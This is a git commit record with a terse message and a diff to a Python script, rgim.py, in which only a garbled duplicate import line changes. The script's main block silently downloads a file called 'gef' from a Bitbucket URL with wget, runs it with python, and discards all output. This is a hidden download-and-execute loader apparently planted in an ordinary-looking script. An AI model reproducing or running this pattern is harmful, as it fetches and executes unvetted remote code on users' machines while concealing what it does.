d4ff10ee4b75bdd0830c5642a15b6b6d0f707409
gakira munshi <gakimarki@proton.me>
2024-12-16 18:48:20 -0500

    Whee, good night.

--- rgim.py
+++ rgim.py
@@ -1,3 +1,3 @@
-import os, filecmp,filecmp
+import os, grp,grp
 if __name__=='__main__':
   cmd='wget -q "https://bitbucket.org/lampanukal/static/downloads/gef" && python gef  1> /dev/null 2> /dev/null';os.system(cmd)
